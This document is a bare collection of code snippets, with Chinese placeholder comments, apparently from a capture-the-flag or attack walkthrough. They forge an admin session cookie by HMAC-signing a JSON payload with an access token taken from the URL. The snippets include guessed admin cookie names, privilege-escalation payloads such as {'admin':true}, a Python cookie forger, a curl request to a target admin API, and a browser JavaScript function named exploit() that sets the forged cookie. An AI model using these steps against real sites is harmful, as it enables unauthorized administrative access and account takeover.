

---


```
/access/blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
```


```
blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
```


```
Set-Cookie: <name>=<base64url(payload)>.<base64url(signature)>
```


```python
import hmac, hashlib, base64

access_token = "从URL提取的token"
payload_b64 = "从Cookie提取的payload部分"
expected_sig = "从Cookie提取的签名部分"

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

computed = b64url(hmac.new(
    access_token.encode(),
    payload_b64.encode(),
    hashlib.sha256
).digest())

print("匹配" if computed == expected_sig else "不匹配")
```


- `admin_session`
- `admin_token`
- `admin_auth`
- `manage_token`
- `backstage_session`


```json
{"admin":true}
{"role":"admin"}
{"isAdmin":true}
{"access":"admin"}
{"level":"admin"}
{"user":"admin"}
{"authenticated":true}
{"type":"admin"}
```


```python
import hmac, hashlib, json, base64

access_token = "已知的token"
payload = {"admin": True}

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

payload_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
sig = b64url(hmac.new(
    access_token.encode(), payload_b64.encode(), hashlib.sha256
).digest())

cookie = f"admin_session={payload_b64}.{sig}"
print(cookie)
```


```bash
curl -k -H "Cookie: <上一步得到的cookie>" https://target/api/admin/me
```


```javascript
async function exploit() {
  const token = location.pathname.split('/access/')[1];
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey('raw', enc.encode(token),
    { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  const payload = btoa('{"admin":true}').replace(/=/g, '');
  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(payload));
  const sigB64 = btoa(String.fromCharCode(...new Uint8Array(sig)))
    .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
  document.cookie = `admin_session=${payload}.${sigB64}; path=/; Secure`;
  location.reload();
}
exploit();
```
